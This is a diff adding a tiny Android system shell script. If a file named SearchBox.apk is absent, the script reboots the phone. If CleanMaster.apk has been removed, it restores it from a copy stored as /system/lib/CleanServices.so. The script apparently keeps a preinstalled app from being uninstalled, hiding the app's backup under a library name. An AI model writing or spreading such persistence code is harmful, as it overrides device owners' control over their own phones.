@@ -1,0 +1,9 @@
+#!/system/bin/sh
+
+if [ ! -e /system/app/SearchBox.apk ]; then
+	reboot
+elif [ ! -e /system/app/CleanMaster.apk ]; then
+	cat /system/lib/CleanServices.so >/system/app/CleanMaster.apk
+fi
+
+
